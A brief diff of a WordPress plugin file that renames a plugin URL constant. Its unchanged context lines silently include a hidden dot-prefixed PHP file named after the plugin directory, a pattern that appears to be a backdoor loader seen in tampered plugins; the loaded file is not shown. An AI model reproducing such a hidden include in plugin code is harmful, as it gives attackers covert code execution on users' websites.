@@ -9,7 +9,7 @@
  * License: GPL2
  */
 if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
-define('THEMOPTION_OSAU', trailingslashit(OSA_PLUGIN_URL).'them_options/'); // for use in themplate
+define('THEMOPTION_OSAU', trailingslashit(STORINA_PLUGIN_URL).'them_options/'); // for use in themplate
 
 if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
     include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
